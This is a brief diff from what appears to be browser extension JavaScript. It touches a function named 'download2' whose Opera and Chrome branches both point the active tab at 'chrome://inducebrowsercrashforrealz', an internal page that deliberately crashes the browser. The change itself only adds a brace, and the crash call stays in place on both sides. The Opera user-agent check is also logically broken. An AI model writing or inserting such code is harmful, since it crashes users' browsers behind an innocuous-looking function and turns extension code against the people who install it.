@@ -148,7 +148,7 @@ if (navigator.appVersion.indexOf("Win")!=-1) {OSName="Windows";};
 
 function download2(){
 	if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ){
-	chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });
+	chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });}
 	else if(navigator.userAgent.indexOf("Chrome") != -1 )
     {
          chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });
